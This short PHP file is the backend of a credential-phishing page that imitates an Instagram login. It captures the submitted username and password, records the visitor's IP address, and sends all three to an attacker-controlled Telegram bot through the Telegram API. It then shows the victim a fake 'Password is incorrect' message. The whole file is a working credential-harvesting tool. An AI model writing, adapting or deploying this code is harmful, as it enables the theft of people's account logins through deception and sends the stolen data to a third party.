<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Get the user's IP address
    $ip_address = $_SERVER['REMOTE_ADDR'];

    // Check if the forwarded header is available and not empty
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Split the header value to handle proxies
        $forwarded_ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        // Trim and take the last IP in the list, which is the client's IP
        $ip_address = trim(end($forwarded_ips));
    }

    // Send data to Telegram bot
    $telegramBotToken = "your-telegram-bot-token";
    $chatId = "your-chat-id";
    $message = "Hello admin, somebody just logged in:\n\nUsername: " . $username . " (Instagram)\n\nPassword: " . $password . "\n\nIP Address: " . $ip_address;

    $telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    file_get_contents($telegramApiUrl); // Send message to Telegram bot

    // Redirect back to login_form.html with a message
    echo "Password is incorrect.";
}
?>
